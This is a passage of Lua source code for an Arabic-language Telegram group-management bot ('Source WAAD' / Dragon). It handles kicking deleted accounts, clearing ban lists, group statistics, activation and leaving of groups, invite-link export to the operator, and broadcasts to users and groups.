ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم اعاده تثبيت الرسالة بنجاح\n✓")
end end
end
--     Source WAAD     --
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' or text == 'طرد الحسابات المحذوفه' or text == 'حذف المحذوفين' then  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
ChatKick(msg.chat_id_, data.id_)
end
end,nil)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم طرد المحذوفين")  
end,nil)
end
--     Source WAAD     --
if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and ChCheck(msg) or text and text:match("^مسح المطرودين$") or text and text:match("^حذف المطرودين$") and ChCheck(msg) then
local function RemoveBlockList(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_AIAN(msg.chat_id_, msg.id_, 0,'⌯︙*لا يوجد محظورين*', 1, 'md')
DevAIAN:del(WAAD..'AIAN:Ban:'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
DevAIAN:del(WAAD..'AIAN:Ban:'..msg.chat_id_)
x = x + 1
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المحظورين\n✓")  
end
end
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
end
--     Source WAAD     --
if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الكروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
local Muted = DevAIAN:scard(WAAD.."AIAN:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المجموعه ↫ ❨ '..dp.title_..' ❩\n⌯︙الايدي ↫ ❨ '..msg.chat_id_..' ❩\n⌯︙عدد الاعضاء ↫ ❨ *'..data.member_count_..'* ❩\n⌯︙عدد الادمنيه ↫ ❨ *'..data.administrator_count_..'* ❩\n⌯︙عدد المطرودين ↫ ❨ *'..data.kicked_count_..'* ❩\n⌯︙عدد المكتومين ↫ ❨ *'..Muted..'* ❩\n⌯︙عدد رسائل المجموعه ↫ ❨ *'..(msg.id_/2097152/0.5)..'* ❩\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n', 1, 'md') 
end,nil)
end,nil)
end
--     Source WAAD     --
if text and text:match('^كشف (-%d+)') then
local ChatId = text:match('كشف (-%d+)') 
if not SudoBot(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطورين فقط', 1, 'md')
else
local ConstructorList = DevAIAN:scard(WAAD.."AIAN:Constructor:"..ChatId) or 0
local BanedList = DevAIAN:scard(WAAD.."AIAN:Ban:"..ChatId) or 0
local ManagerList = DevAIAN:scard(WAAD.."AIAN:Managers:"..ChatId) or 0
local MutedList = DevAIAN:scard(WAAD.."AIAN:Muted:"..ChatId) or 0
local TkeedList = DevAIAN:scard(WAAD.."AIAN:AIAN:Tkeed:"..ChatId) or 0
local AdminsList = DevAIAN:scard(WAAD.."AIAN:Admins:"..ChatId) or 0
local VipList = DevAIAN:scard(WAAD.."AIAN:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/CXRCX' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,AIAN) 
if AIAN.first_name_ ~= false then
ConstructorAIAN = "["..AIAN.first_name_.."](T.me/"..(AIAN.username_ or "CXRCX")..")"
else 
ConstructorAIAN = "حساب محذوف"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙المجموعه ↫ ["..dp.title_.."]("..LinkGroup..")\n⌯︙الايدي ↫ ( `"..ChatId.."` )\n⌯︙المنشئ ↫ "..ConstructorAIAN.."\n⌯︙عدد المدراء ↫ ( *"..ManagerList.."* )\n⌯︙عدد المنشئين ↫ ( *"..ConstructorList.."* )\n⌯︙عدد الادمنيه ↫ ( *"..AdminsList.."* )\n⌯︙عدد المميزين ↫ ( *"..VipList.."* )\n⌯︙عدد المحظورين ↫ ( *"..BanedList.."* )\n⌯︙عدد المقيدين ↫ ( *"..TkeedList.."* )\n⌯︙عدد المكتومين ↫ ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لم تتم اضافتي بها لاقوم بكشفها", 1, "md")
end
end,nil)
end,nil)
end 
end
--     Source WAAD     --
if text and text:match("^غادر (-%d+)$")  then
local Text = { string.match(text, "^(غادر) (-%d+)$")}
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط', 1, 'md')
else 
tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp) 
if dp.id_ then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙المجموعه ↫ ["..dp.title_.."]\n⌯︙تمت المغادره منها بنجاح", 1, "md")
Dev_AIAN(Text[2], 0, 1, "⌯︙بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
ChatLeave(dp.id_, WAAD)
DevAIAN:srem(WAAD.."AIAN:Groups", dp.id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
end 
end,nil)
end 
end
--     Source WAAD     --
if text and text:match("^تعين عدد الاعضاء (%d+)$") and SecondSudo(msg) or text and text:match("^تعيين عدد الاعضاء (%d+)$") and SecondSudo(msg) then
local Num = text:match("تعين عدد الاعضاء (%d+)$") or text:match("تعيين عدد الاعضاء (%d+)$")
DevAIAN:set(WAAD..'AIAN:Num:Add:Bot',Num) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم وضع عدد الاعضاء ↫ *'..Num..'* عضو', 1, 'md')
end
--     Source WAAD     --
if text == 'تفعيل البوت الخدمي' or text == '↫ تفعيل البوت الخدمي ⌯' then 
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط', 1, 'md')
else 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل البوت الخدمي بنجاح")
DevAIAN:del(WAAD..'AIAN:Lock:FreeBot'..WAAD) 
end 
end
if text == 'تعطيل البوت الخدمي' or text == '↫ تعطيل البوت الخدمي ⌯' then 
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط', 1, 'md')
else 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل البوت الخدمي بنجاح")
DevAIAN:set(WAAD..'AIAN:Lock:FreeBot'..WAAD,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل الالعاب بنجاح")
DevAIAN:del(WAAD..'AIAN:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل الالعاب بنجاح")
DevAIAN:set(WAAD..'AIAN:Lock:Games'..msg.chat_id_,true)  
end
if text == "تفعيل الرابط" or text == "تفعيل جلب الرابط" then 
if BasicConstructor(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل جلب رابط المجموعه بنجاح")
DevAIAN:set(WAAD.."AIAN:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
if text == "تعطيل الرابط" or text == "تعطيل جلب الرابط" then 
if BasicConstructor(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل جلب رابط المجموعه بنجاح")
DevAIAN:del(WAAD.."AIAN:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
--     Source WAAD     --
if text and text:match('^تفعيل$') and SudoBot(msg) and ChCheck(msg) then
if ChatType ~= 'sp' then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(DevAIAN:get(WAAD..'AIAN:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عدد اعضاء المجموعه اقل من ↫ *'..(DevAIAN:get(WAAD..'AIAN:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,SoOoFi) 
local admins = SoOoFi.members_
for i=0 , #admins do
if SoOoFi.members_[i].bot_info_ == false and SoOoFi.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if SoOoFi.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevAIAN:sadd(WAAD.."AIAN:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAIAN:sadd(WAAD.."AIAN:AIANConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAIAN:srem(WAAD.."AIAN:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAIAN:srem(WAAD.."AIAN:AIANConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevAIAN:sismember(WAAD..'AIAN:Groups',msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المجموعه بالتاكيد مفعله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","⌯︙تم تفعيل المجموعه "..dp.title_)  
DevAIAN:sadd(WAAD.."AIAN:Groups",msg.chat_id_)
if not DevAIAN:get(WAAD..'AIAN:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevAIAN:incrby(WAAD..'AIAN:Sudos'..msg.sender_user_id_,1)
DevAIAN:set(WAAD..'AIAN:SudosGp'..msg.sender_user_id_..msg.chat_id_,"AIAN")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevAIAN:set(WAAD.."AIAN:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(WAAD,"⌯︙تم تفعيل مجموعه جديده ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙بواسطة ↫ "..Name.."\n⌯︙اسم المجموعه ↫ ["..NameChat.."]\n⌯︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n⌯︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌯︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙الوقت ↫ "..os.date("%I:%M%p").."\n⌯︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end,nil)
end
if text == 'تعطيل' and SudoBot(msg) and ChCheck(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevAIAN:sismember(WAAD..'AIAN:Groups',msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المجموعه بالتاكيد معطله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","⌯︙تم تعطيل المجموعه "..dp.title_)  
DevAIAN:srem(WAAD.."AIAN:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevAIAN:set(WAAD.."AIAN:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(WAAD,"⌯︙تم تعطيل مجموعه جديده ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙بواسطة ↫ "..Name.."\n⌯︙اسم المجموعه ↫ ["..NameChat.."]\n⌯︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌯︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙الوقت ↫ "..os.date("%I:%M%p").."\n⌯︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end
end
--     Source WAAD     --
if text and text:match("^المطور$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
LinkGroup = "⌯︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩"
else
LinkGroup = '⌯︙ليست لدي صلاحية الدعوه لهذه المجموعه !'
end
if not Sudo(msg) then
SendText(WAAD,"⌯︙هناك من بحاجه الى مساعده ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙الشخص ↫ "..Name.."\n⌯︙اسم المجموعه ↫ ["..NameChat.."]\n⌯︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n"..LinkGroup.."\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙الوقت ↫ "..os.date("%I:%M%p").."\n⌯︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
--     Source WAAD     --
if text == 'تحديثات دراكون' or text == '↫ تحديثات دراكون ⌯' then
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس دراكون*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '📂┇𝙳𝚁𝙰𝙶𝙾𝙽 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/FIDRG"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(updatech).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source WAAD     --
if text == 'اشتراك البوت' or text == 'اشتري بوت' or text == 'اشتراك بوت' or text == 'منين هذا البوت' or text == 'البوت' or text == "↫ أشتراك البوت ⌯" then  
local updatech =[[
*لشراء او تجديد اشتراكك في سورس دراكون*
*قم بالتواصل مع مطورين دراكون*
*ننصح بالاشتراك عند مطورين دراكون لحل جميع المشاكل*
*والاجابه علئ جميع الاستفسارت والطلبات*
*اشترك واحصل علئ اسرع اداء للبوتات وعدم التوقف*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝚂𝙾𝙵𝙸 || صـوفي', url="t.me/VvTVv2"},{text = '› 𝘮𝘶𝘕𝘛𝘢𝘋𝘏𝘦𝘙 ', url="t.me/mndzr"}},
{{text = 'تواصـل سورس دراكـون 📬', url="t.me/S0DRGbot"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(updatech).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source WAAD     --
if text == 'روابط الكروبات' or text == 'روابط المجموعات' or text == '↫ روابط المجموعات ⌯' then
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
local List = DevAIAN:smembers(WAAD.."AIAN:Groups")
if #List == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا توجد مجموعات مفعله', 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙جاري ارسال نسخه تحتوي على ↫ '..#List..' مجموعه', 1, 'md')
local Text = "⌯︙Source WAAD\n⌯︙File Bot Groups\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
for k,v in pairs(List) do
local GroupsManagers = DevAIAN:scard(WAAD.."AIAN:Managers:"..v) or 0
local GroupsAdmins = DevAIAN:scard(WAAD.."AIAN:Admins:"..v) or 0
local Groupslink = DevAIAN:get(WAAD.."AIAN:Groups:Links" ..v)
Text = Text..k.." ↬ ⤈ \n⌯︙Group ID ↬ "..v.."\n⌯︙Group Link ↬ "..(Groupslink or "Not Found").."\n⌯︙Group Managers ↬ "..GroupsManagers.."\n⌯︙Group Admins ↬ "..GroupsAdmins.."\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(Text)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './GroupsBot.txt',dl_cb, nil)
io.popen('rm -rf ./GroupsBot.txt')
end
end
end
--     Source WAAD     --
if text == "اذاعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص ⌯" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAIAN:get(WAAD.."AIAN:Send:Bot"..WAAD) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌯︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAIAN:setex(WAAD.."AIAN:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌯︙للخروج ارسل ↫ ( الغاء ) \n ✓")
return false
end 
if DevAIAN:get(WAAD.."AIAN:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAIAN:del(WAAD.."AIAN:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevAIAN:smembers(WAAD..'AIAN:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
AIANText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
AIANText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
AIANText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
AIANText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
AIANText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
AIANText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
AIANText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
AIANText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم اذاعة "..AIANText.." بنجاح \n⌯︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
DevAIAN:del(WAAD.."AIAN:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source WAAD     --
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام ⌯" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAIAN:get(WAAD.."AIAN:Send:Bot"..WAAD) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌯︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAIAN:setex(WAAD.."AIAN:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌯︙للخروج ارسل ↫ ( الغاء ) \n ✓")
return false
end 
if DevAIAN:get(WAAD.."AIAN:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAIAN:del(WAAD.."AIAN:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevAIAN:smembers(WAAD..'AIAN:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
AIANText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
AIANText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
AIANText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
AIANText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
AIANText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
AIANText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
AIANText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
AIANText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم اذاعة "..AIANText.." بنجاح \n⌯︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevAIAN:del(WAAD.."AIAN:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source WAAD     --
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام بالتوجيه ⌯" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAIAN:get(WAAD.."AIAN:Send:Bot"..WAAD) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌯︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAIAN:setex(WAAD.."AIAN:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙ارسل الرساله الان لتوجيها \n⌯︙للخروج ارسل ↫ ( الغاء ) \n ✓")
return false
end 
if DevAIAN:get(WAAD.."AIAN:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAIAN:del(WAAD.."AIAN:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevAIAN:smembers(WAAD..'AIAN:Groups')   
for k,v in pairs(List) do  
